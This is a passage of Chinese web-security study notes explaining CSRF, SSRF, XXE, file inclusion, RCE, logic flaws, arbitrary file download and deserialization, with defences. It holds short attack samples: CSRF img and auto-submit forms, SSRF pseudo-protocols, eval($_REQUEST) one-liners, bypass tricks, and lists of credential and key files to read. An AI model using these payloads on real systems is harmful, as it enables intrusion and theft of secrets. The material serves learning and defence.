<h3 id="4-2、csrf与xss区别、CSRF跟SSRF的区别"><a href="#4-2、csrf与xss区别、CSRF跟SSRF的区别" class="headerlink" title="4.2、csrf与xss区别、CSRF跟SSRF的区别"></a>4.2、csrf与xss区别、CSRF跟SSRF的区别</h3><p>XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。<strong>它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。</strong>这类攻击通常包含了HTML以及客户端脚本语言（最常见如：JavaScript）</p>
<p>还有就是xss是盗用cookie、CSRF是借用cookie。</p>
<p><strong>CSRF和SSRF的区别：</strong></p>
<p>SSRF （Server-side Request Forgery） 和 CSRF （Cross-site Request Forgery） 是两种不同的网络安全攻击。</p>
<p>CSRF 攻击是指攻击者通过构造恶意请求，在目标用户的浏览器中自动向网站发送请求，从而以目标用户的名义实施恶意操作。这种攻击通常通过嵌入恶意代码（例如广告或链接）到网站，以让目标用户访问网站时自动向目标网站发送请求来实现。</p>
<p>SSRF 攻击是指攻击者通过利用服务器的请求功能，向其他服务器发送请求，并读取响应。这种攻击可以通过绕过防火墙或内部服务器的安全限制来读取敏感数据，或者通过诱导服务器执行恶意操作来攻击其他服务器。</p>
<p>总的来说，CSRF 攻击通过在目标用户的名义实施恶意操作，而 SSRF 攻击通过利用服务器的请求功能来读取敏感数据或实施攻击。因此，预防和应对这两种攻击的方法也不尽相同，需要根据实际情况采取不同的安全措施。</p>
<h3 id="4-3、csrf原理"><a href="#4-3、csrf原理" class="headerlink" title="4.3、csrf原理"></a>4.3、csrf原理</h3><p>用户user打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p>
<p>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p>
<p>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</p>
<p>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</p>
<p>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p>
<h3 id="4-4、CSRF分类"><a href="#4-4、CSRF分类" class="headerlink" title="4.4、CSRF分类"></a>4.4、CSRF分类</h3><h4 id="Get型"><a href="#Get型" class="headerlink" title="Get型"></a>Get型</h4><p>这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p>
<p>&lt;img src&#x3D;<a class="link"   href="http://example.cn/csrf.php?xx=11" >http://example.cn/csrf.php?xx=11 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x2F;&gt;</p>
<p>在访问含有这个img的页面后，浏览器会自动向<code>http://example.cn/csrf.php?xx=11</code>发出一次HTTP请求。example.cn就会收到包含受害者登录信息的一次跨域请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。</p>
<h4 id="Post型"><a href="#Post型" class="headerlink" title="Post型"></a>Post型</h4><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">&lt;form action=http://example.cn/csrf.php method=POST&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;xx&quot; value=&quot;11&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p>
<p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p>
<h4 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h4><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击</p>
<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的 iframe 页面。</p>
<h3 id="4-5、CSRF特点以及危害"><a href="#4-5、CSRF特点以及危害" class="headerlink" title="4.5、CSRF特点以及危害"></a>4.5、CSRF特点以及危害</h3><h4 id="csrf特点"><a href="#csrf特点" class="headerlink" title="csrf特点"></a>csrf特点</h4><p>1、攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</p>
<p>2、攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</p>
<p>3、跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</p>
<p>4、CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。</p>
<h4 id="csrf危害"><a href="#csrf危害" class="headerlink" title="csrf危害"></a>csrf危害</h4><p>CSRF攻击会根据场景的不同而危害迥异，比较常见的有：</p>
<p>发送邮件<br>修改账户信息<br>资金转账<br>盗取用户隐私数据<br>网站被上传网马<br>作为其他攻击方式的辅助攻击（比如xss）<br>传播CSRF蠕虫</p>
<h2 id="5、ssrf"><a href="#5、ssrf" class="headerlink" title="5、ssrf"></a>5、ssrf</h2><h3 id="5-1、简介"><a href="#5-1、简介" class="headerlink" title="5.1、简介"></a>5.1、简介</h3><p><strong>SSRF（服务端请求伪造）</strong>，是指攻击者向服务端发送包含恶意URI链接的请求，借由服务端去访问此URI，以获取保护网络资源的安全漏洞，是常见的web安全漏洞的一种。</p>
<h3 id="5-2、原理"><a href="#5-2、原理" class="headerlink" title="5.2、原理"></a>5.2、原理</h3><p><strong>由于服务端提供了从其他服务器应用获取数据的功能，但没有对目标地址做过滤与限制，导致攻击者可以操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。（</strong>能够对外发起网络请求的地方，就可能存在SSRF漏洞	）。</p>
<h3 id="5-3、产生SSRF的函数"><a href="#5-3、产生SSRF的函数" class="headerlink" title="5.3、产生SSRF的函数"></a>5.3、产生SSRF的函数</h3><p>file_get_contents</p>
<p>sockopen()</p>
<h3 id="5-4、伪协议"><a href="#5-4、伪协议" class="headerlink" title="5.4、伪协议"></a>5.4、伪协议</h3><p>当我们发现ssrf漏洞的时候，首先就是要测试一下，所有可用的<code>URL伪协议</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure></div>

<h3 id="5-5、危害及绕过方式"><a href="#5-5、危害及绕过方式" class="headerlink" title="5.5、危害及绕过方式"></a>5.5、危害及绕过方式</h3><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等。.</p>
<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>采用http基本身份认证的方式绕过（利用@）</p>
<p>采用短网址绕过</p>
<p>采用进制转换</p>
<p>利用[::]</p>
<p>利用句号</p>
<h3 id="5-6、防御"><a href="#5-6、防御" class="headerlink" title="5.6、防御"></a>5.6、防御</h3><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<p>3,限制请求的端口为http常用的端口，比如：80,443,8080,8090。</p>
<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题</p>
<h2 id="6、XXE"><a href="#6、XXE" class="headerlink" title="6、XXE"></a>6、XXE</h2><h3 id="6-1、概述"><a href="#6-1、概述" class="headerlink" title="6.1、概述"></a>6.1、概述</h3><p>XXE也称为XML外部实体注入攻击，XML External Entity 【XML外部实体】<br>用户输入的数据被当作XML实体代码执行</p>
<h3 id="6-2、原理"><a href="#6-2、原理" class="headerlink" title="6.2、原理"></a>6.2、原理</h3><p>用户输入的数据被当做XML代码进行了执行，利用DTD部分中的关键词SYSTEM发起网络请求从而获得<br>数据</p>
<h3 id="6-3、XML"><a href="#6-3、XML" class="headerlink" title="6.3、XML"></a>6.3、XML</h3><p>可扩展标记语言<br>设计宗旨：传输数据，而非显示数据<br>xml标签没有被预定义，需要自定义标签<br>特点<br>XML仅是存文本，不会执行任何事情<br>XML可以自己发明标签（允许定义自己的标签和文档结构）<br>XML是各种应用程序之间进行数据传输的最常见工具，并且在信息存储和描述领域变得越来越流行<br>简单来说：XML就是存储数据的</p>
<h3 id="6-4、外部实体"><a href="#6-4、外部实体" class="headerlink" title="6.4、外部实体"></a>6.4、外部实体</h3><p>DTD部分里面的一个特殊的地方（SYSTEM）可以调用外部文件进行XML文件的规划（发起网络请求）<br>格式：<!ENTITY 实体名称 SYSTEM “URI"></p>
<h3 id="6-5、特殊函数"><a href="#6-5、特殊函数" class="headerlink" title="6.5、特殊函数"></a>6.5、特殊函数</h3><p>在php中有一个特殊函数：simplexml_load_string()<br>定义：simplexml_load_string(data,classname,options,ns,is_prefix);<br>用法：simplexml_load_string() 函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象</p>
<h3 id="6-6、产生原因"><a href="#6-6、产生原因" class="headerlink" title="6.6、产生原因"></a>6.6、产生原因</h3><p>XML数据在传输中数据被修改，服务器执行被恶意插入代码，最终实现攻击的目的<br>XXE漏洞就是在XML在外部声明的时候出现了问题</p>
<h3 id="6-7、漏洞危害"><a href="#6-7、漏洞危害" class="headerlink" title="6.7、漏洞危害"></a>6.7、漏洞危害</h3><p>任意文件读取<br>系统命令执行<br>内网端口探测<br>攻击内网网站</p>
<h3 id="6-8、防御措施"><a href="#6-8、防御措施" class="headerlink" title="6.8、防御措施"></a>6.8、防御措施</h3><p>使用开发语言提供的禁用外部实体的方法<br>过滤用户提交的XML数据<br>关键词：SYSTEM和PUBLIC</p>
<h2 id="7、文件包含漏洞"><a href="#7、文件包含漏洞" class="headerlink" title="7、文件包含漏洞"></a>7、文件包含漏洞</h2><h3 id="7-1、文件包含漏洞的原理"><a href="#7-1、文件包含漏洞的原理" class="headerlink" title="7.1、文件包含漏洞的原理"></a>7.1、文件包含漏洞的原理</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码并执行，从而节省时间避免再次编写，这种调用文件的过程被称为包含。但是如果开发人员没有对包含的文件来源进行严格的审查，导致包含了其它恶意文件，执行了非预期的代码，就会引发文件包含漏洞。</p>
<h3 id="7-2、php中的相关函数"><a href="#7-2、php中的相关函数" class="headerlink" title="7.2、php中的相关函数"></a>7.2、php中的相关函数</h3><p>PHP中引发文件包含漏洞的函数有以下四种：</p>
<p>require()         &#x2F;&#x2F;在php文件被执行之前，php解析器会用被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最好按新的php文件执行程序代码<br>require_once()v         &#x2F;&#x2F;require语句的延伸，他的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件<br>include()             &#x2F;&#x2F;使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行<br>include_once()           &#x2F;&#x2F;使用include_once会在导入文件前先检测该文件是否在该页面的其他部分被引用过，如果有，则不会重复引用该文件，程序只能引用一次</p>
<h3 id="7-3、分类"><a href="#7-3、分类" class="headerlink" title="7.3、分类"></a>7.3、分类</h3><p>文件包含漏洞分为两类，“本地文件包含”和“远程文件包含”。想要实现远程文件包含，需要在 php.ini 文件中开启</p>
<p>allow_url_fopen &#x3D; On 和 allow_url_include &#x3D; On</p>
<p>远程包含的文件是第三方服务器的文件。本地包含就是包含本地服务器的文件</p>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><p>本地文件包含漏洞，顾名思义，指的是能包含本地文件的漏洞。上面的例子就是本地文件包含漏洞。大部分情况下我们遇到的文件包含漏洞都是本地包含漏洞。并且不受 <code>allow_url_fopen = On</code> 和 <code>allow_url_include = On</code> 的影响。</p>
<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>远程文件包含漏洞，是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但远程文件包含漏洞的利用需要 php.ini 文件中</p>
<p>allow_url_fopen &#x3D; On<br>allow_url_include &#x3D; On</p>
<p>两个配置选项均需要为On，才能远程包含文件成功。</p>
<h4 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h4><p>PHP带有很多的封装协议，这些协议是我们使用文件包含漏洞时经常用到的方法，常见的协议有以下几种：</p>
<h5 id="1、file-x2F-x2F"><a href="#1、file-x2F-x2F" class="headerlink" title="1、file:&#x2F;&#x2F;"></a>1、file:&#x2F;&#x2F;</h5><p>file:&#x2F;&#x2F;伪协议用于访问本地文件系统，读取文件的内容，</p>
<h5 id="2、php-x2F-x2F-filter"><a href="#2、php-x2F-x2F-filter" class="headerlink" title="2、php:&#x2F;&#x2F;filter"></a>2、php:&#x2F;&#x2F;filter</h5><p>php:&#x2F;&#x2F;filter 可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter 流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>
<h5 id="3、php-x2F-x2F-input"><a href="#3、php-x2F-x2F-input" class="headerlink" title="3、php:&#x2F;&#x2F;input"></a>3、php:&#x2F;&#x2F;input</h5><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。</p>
<h5 id="4、data-text-x2F-plain"><a href="#4、data-text-x2F-plain" class="headerlink" title="4、data:text&#x2F;plain"></a>4、data:text&#x2F;plain</h5><p>和 <code>php://input</code> 类似，也可以执行任意代码，但利用条件和用法不同</p>
<h5 id="5、zip-x2F-x2F-伪协议"><a href="#5、zip-x2F-x2F-伪协议" class="headerlink" title="5、zip:&#x2F;&#x2F;伪协议"></a>5、zip:&#x2F;&#x2F;伪协议</h5><p>访问压缩包中的文件，不管后缀是什么，都会当做压缩包来解压。</p>
<h5 id="6、phar-x2F-x2F-伪协议"><a href="#6、phar-x2F-x2F-伪协议" class="headerlink" title="6、phar:&#x2F;&#x2F;伪协议"></a>6、phar:&#x2F;&#x2F;伪协议</h5><p>与 zip:&#x2F;&#x2F; 协议类似，但用法不同，zip:&#x2F;&#x2F; 是用 # 把文件隔开，而 phar:&#x2F;&#x2F; 是用<code>/</code>把文件名隔开，即</p>
<p>?page&#x3D;phar:&#x2F;&#x2F;[压缩文件路径]&#x2F;[压缩文件内的子文件名]</p>
<h3 id="7-4、漏洞修复"><a href="#7-4、漏洞修复" class="headerlink" title="7.4、漏洞修复"></a>7.4、漏洞修复</h3><p>1、PHP 中使用 open_basedir 配置限制访问在指定的区域<br> 2、过滤.（点）&#x2F;（反斜杠）\（反斜杠）等特殊字符<br> 3、尽量关闭 allow_url_include 配置</p>
<h2 id="8、代码执行漏洞"><a href="#8、代码执行漏洞" class="headerlink" title="8、代码执行漏洞"></a>8、代码执行漏洞</h2><h3 id="8-1、概述"><a href="#8-1、概述" class="headerlink" title="8.1、概述"></a>8.1、概述</h3><p>用户输入的数据被当作后端代码执行</p>
<p>后端代码：PHP 、ASP 、ASPX、JSP</p>
<h3 id="8-2、RCE"><a href="#8-2、RCE" class="headerlink" title="8.2、RCE"></a>8.2、RCE</h3><p>远程命令或代码执行<br>命令执行：用户输入的数据会被当做系统命令执行<br>代码执行：用户输入的数据会被当做后端代码执行<br>只要渗透的最终情况可以实现执行命令或者代码都属于RCE</p>
<h3 id="8-3、函数"><a href="#8-3、函数" class="headerlink" title="8.3、函数"></a>8.3、函数</h3><p>eval($a); &#x2F;&#x2F;eval是代码执行用的最多的，他可以多行执行<br>eval( $_ REQUEST[‘a’]);<br>assert($a)&#x2F;&#x2F;只能单行执行<br>assert( $<em>REQUEST[‘a’]);<br>file_put_contents()写文件<br>file</em> put_contents(‘1.php’,’<?php var_dump(8);phpinfo();?>‘)<br>特殊组合： ${}<br>&#x2F;&#x2F;PHP版本5.5及其以上版本可以使用<br>${phpinfo()}; &#x2F;&#x2F; 代码执行phpinfo()</p>
<h2 id="9、命令执行漏洞"><a href="#9、命令执行漏洞" class="headerlink" title="9、命令执行漏洞"></a>9、命令执行漏洞</h2><h3 id="9-1、概述"><a href="#9-1、概述" class="headerlink" title="9.1、概述"></a>9.1、概述</h3><p>命令执行：用户输入的数据被当做系统命令执行</p>
<h3 id="9-2、系统命令函数"><a href="#9-2、系统命令函数" class="headerlink" title="9.2、系统命令函数"></a>9.2、系统命令函数</h3><p>system() 执行命令输出结果<br>exec() 只会得到结果最后一行<br>passthru() 调用命令，将命令结果原样输出<br>shell_exec() 会得到结果的全部<br>特殊符号&#96;&#96; &lt;&#x3D;&gt; shell_exec()调用命令得出结果<br>popen(要执行的命令，参数) &#x2F;&#x2F;参数中r是只读，w是写入<br>$a &#x3D; popen(‘whoami’,’r’);<br>echo fread($a,1024);<br>在CMD中利用环境变量的值进行取点操作<br>切割获得点：echo %PATHEXT:~0,1%</p>
<h2 id="10、业务逻辑漏洞"><a href="#10、业务逻辑漏洞" class="headerlink" title="10、业务逻辑漏洞"></a>10、业务逻辑漏洞</h2><h3 id="10-1、概述"><a href="#10-1、概述" class="headerlink" title="10.1、概述"></a>10.1、概述</h3><p>越权漏洞是一种很常见的逻辑安全漏洞，是由于服务器端对客户提出的数据操作请求过分信任，忽略了<br>对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致<br>越权漏洞。</p>
<h3 id="10-2、分类"><a href="#10-2、分类" class="headerlink" title="10.2、分类"></a>10.2、分类</h3><p>水平越权：相同权限下不同的用户可以互相访问；<br>垂直越权：使用权限低的用户可以访问到权限较高的用户；<br>交叉越权：既可水平也可垂直。</p>
<h3 id="10-3、防护"><a href="#10-3、防护" class="headerlink" title="10.3、防护"></a>10.3、防护</h3><p>验证一切来自客户端的参数，重点是和权限相关的参数，比如用户ID或者角色权限ID等。</p>
<p>session ID 和认证token做绑定，放在服务器的会话里，不发送给客户端。</p>
<p>对于用户登录后涉及用户唯一信息的请求，每次都要验证检查所有权，敏感信息页面加随机数的参<br>数，防止浏览器缓存内容。</p>
<p>把程序分成匿名、授权和管理的区域，将角色和数据功能匹配。</p>
<h3 id="11、未授权访问"><a href="#11、未授权访问" class="headerlink" title="11、未授权访问"></a>11、未授权访问</h3><h4 id="11-1、概述"><a href="#11-1、概述" class="headerlink" title="11.1、概述"></a>11.1、概述</h4><p>未授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面<br>或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制到其他浏览器或其他电脑<br>上进行访问，观察是否能访问成功。(只要输入正确的网址就可以直接访问)</p>
<h4 id="11-2、防护"><a href="#11-2、防护" class="headerlink" title="11.2、防护"></a>11.2、防护</h4><p>对未授权访问页面做Session认证，并对用户访问的每一个URL做身份鉴别，正确地校验用户ID及<br>Token等。</p>
<h3 id="11-3、验证码绕过"><a href="#11-3、验证码绕过" class="headerlink" title="11.3、验证码绕过"></a>11.3、验证码绕过</h3><p>常见的绕过：<br>前端验证验证码，并没有后端验证，直接抓包然后进行跑数据包(前端验证不可靠)<br>验证码设置了但是并没有效验，乱输验证码也能够成功的登录<br>验证码可以重复使用<br>验证码空值绕过<br>验证码干扰过低，轻松使用脚本识别<br>验证码会在HTML页面输出<br>验证码可控制，比如他的验证码包含在URL里面，是一个URL传参，我们可以把URL设置定，那么验证码<br>可控制<br>验证码有规则，比如是时间戳的后6位<br>验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数<br>有万能验证码，验证码无论是什么，只要输入000000就能直接绕过</p>
<h3 id="11-4、密码找回漏洞"><a href="#11-4、密码找回漏洞" class="headerlink" title="11.4、密码找回漏洞"></a>11.4、密码找回漏洞</h3><p>场景：<br>密码找回凭证可被暴力破解；<br>密码找回凭证直接返回给客户端；<br>密码重置链接存在弱Token；<br>密码重置凭证与用户账户关联不严；<br>重新绑定用户手机或邮箱；<br>严禁复制<br>file_put_contents()写文件<br>防护：发送一个重置密码的链接到邮箱</p>
<h3 id="12、任意文件下载"><a href="#12、任意文件下载" class="headerlink" title="12、任意文件下载"></a>12、任意文件下载</h3><h4 id="12-1、原理"><a href="#12-1、原理" class="headerlink" title="12.1、原理"></a>12.1、原理</h4><p>大多数业务系统或站点为用户提供了下载功能，如果未对用户访问或下载文件做出任何限制，则<br>有可能导致任意文件下载漏洞。使得用户可以查看或下载服务器上的任意文件。</p>
<h4 id="12-2、危害"><a href="#12-2、危害" class="headerlink" title="12.2、危害"></a>12.2、危害</h4><p>任意文件下载漏洞可以导致敏感信息(如源码、配置信息、口令等)泄露。攻击者可以进行口令<br>破解或进行信息收集，通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的<br>信息来进一步挖掘服务器漏洞从而入侵。</p>
<h4 id="12-3、windows敏感文件"><a href="#12-3、windows敏感文件" class="headerlink" title="12.3、windows敏感文件"></a>12.3、windows敏感文件</h4><p>C:\boot.ini &#x2F;&#x2F;查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件<br>C:\Windows\repair\sam &#x2F;&#x2F;存储系统初次安装的密码<br>C: \Program Files\mysql\my.ini &#x2F;&#x2F; Mysql配置<br>C: \ Program Files\mysql\data\ mysql\user.MYD &#x2F;&#x2F; Mysql root<br>C:\Windows\php.ini &#x2F;&#x2F;php配置信息<br>C:\Windows\my.ini &#x2F;&#x2F;Mysql配置信息<br>C:\Windows\win.ini &#x2F;&#x2F;Windows系统的一个基本系统配置文件</p>
<h4 id="12-4、linux敏感文件"><a href="#12-4、linux敏感文件" class="headerlink" title="12.4、linux敏感文件"></a>12.4、linux敏感文件</h4><p>&#x2F; root&#x2F;. ssh&#x2F; authorized_ keys<br>&#x2F;root&#x2F;. ssh&#x2F;id_rsa<br>&#x2F; root&#x2F;. ssh&#x2F;id_ras.keystore<br>&#x2F;root&#x2F;.ssh&#x2F;known_hosts &#x2F;&#x2F;记录每个访问计算机用户的公钥<br>&#x2F; etc&#x2F; passwd<br>&#x2F; etc&#x2F; shadow<br>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql配置文件<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件<br>&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;用户历史命令记录文件</p>
<h2 id="13、变量覆盖漏洞"><a href="#13、变量覆盖漏洞" class="headerlink" title="13、变量覆盖漏洞"></a>13、变量覆盖漏洞</h2><h3 id="13-1、概述"><a href="#13-1、概述" class="headerlink" title="13.1、概述"></a>13.1、概述</h3><p>定义：将程序中原有的变量值进行替换，从而达到攻击目的<br>用自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻<br>击</p>
<h3 id="13-2、变量覆盖函数"><a href="#13-2、变量覆盖函数" class="headerlink" title="13.2、变量覆盖函数"></a>13.2、变量覆盖函数</h3><p>$$<br>$$这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名</p>
<p>extract()函数<br>extract() 从数组中将变量导入到当前的符号表 ，将数组中的键作为变量名，值作为变量的值<br>parse_str()函数<br>parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以<br>直接覆盖掉已有变量<br>注意：如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量<br>import_request_variables()函数<br>import_request_variables：将 GET／POST／Cookie 变量导入到全局作用域中<br>import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量,用在register_globals<br>被禁止的时候</p>
<h3 id="13-3、利用场景"><a href="#13-3、利用场景" class="headerlink" title="13.3、利用场景"></a>13.3、利用场景</h3><p>大多数情况下由函数使用不当导致的<br>$$使用不当<br>extract()函数使用不当<br>parse_str()函数使用不当<br>import_request_variables()使用不当<br>开启了全局变量注册等</p>
<h3 id="13-4、漏洞危害"><a href="#13-4、漏洞危害" class="headerlink" title="13.4、漏洞危害"></a>13.4、漏洞危害</h3><p>变量覆盖的漏洞危害主要还是要看代码具体的流程<br>如果可覆盖掉的变量在后面会进行代码执行，那么他的危害就是代码执行</p>
<h2 id="14、反序列化漏洞"><a href="#14、反序列化漏洞" class="headerlink" title="14、反序列化漏洞"></a>14、反序列化漏洞</h2><h3 id="14-1、概述"><a href="#14-1、概述" class="headerlink" title="14.1、概述"></a>14.1、概述</h3><blockquote>
<p><strong>序列化</strong>：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。</p>
<p><strong>反序列化</strong>：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p>
<p>反序列化是一种将二进制或文本数据转换回原始数据结构的过程。它与序列化相对，序列化是将原始数据结构转换为二进制或文本数据的过程。</p>
<p>反序列化在许多方面都很有用，例如：</p>
<ul>
<li>在网络通信中，您可以使用序列化将数据从一台计算机传输到另一台计算机，然后使用反序列化将其还原。</li>
<li>在数据存储方面，您可以使用序列化将数据保存到文件或数据库中，然后使用反序列化读取数据。</li>
</ul>
<p>然而，如果不当使用反序列化，可能会导致安全问题，例如：</p>
<ul>
<li>反序列化漏洞：反序列化漏洞是一种常见的安全漏洞，可以导致攻击者在服务器上执行任意代码。</li>
<li>序列化篡改：如果数据在网络上传输或存储时未加密，攻击者可以篡改序列化数据，并在反序列化时导致安全问题。</li>
</ul>
</blockquote>
<h3 id="14-2、成因"><a href="#14-2、成因" class="headerlink" title="14.2、成因"></a>14.2、成因</h3><p>在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro  1.2.4），使用不安全的反序列化框架库（如Fastjson  1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p>
<h3 id="14-3、漏洞可能出现的位置"><a href="#14-3、漏洞可能出现的位置" class="headerlink" title="14.3、漏洞可能出现的位置"></a>14.3、漏洞可能出现的位置</h3><p>1.解析认证token、session的位置</p>
<p>2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等</p>
<p>3.将对象序列化后在网络中传输，如传输json数据，xml数据等</p>
<p>4.参数传递给程序</p>
<p>5.使用RMI协议，被广泛使用的RMI协议完全基于序列化</p>
<p>6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等</p>
<p>7.定义协议用来接收与发送原始的java对象</p>
<h3 id="14-4、漏洞原理"><a href="#14-4、漏洞原理" class="headerlink" title="14.4、漏洞原理"></a>14.4、漏洞原理</h3><p>在Python和PHP中，一般通过构造一个包含魔术方法（在发生特定事件或场景时被自动调用的函数，通常是构造函数或析构函数）的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序反序列化该对象时触发魔术方法从而执行命令或代码。在Java中没有魔术方法，但是有反射机制：在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行。</p>
<h3 id="14-5、魔术方法"><a href="#14-5、魔术方法" class="headerlink" title="14.5、魔术方法"></a>14.5、魔术方法</h3><p>魔术方法：满足条件就会自动触发</p>
<p>construct()   当一个对象创建时被调用</p>
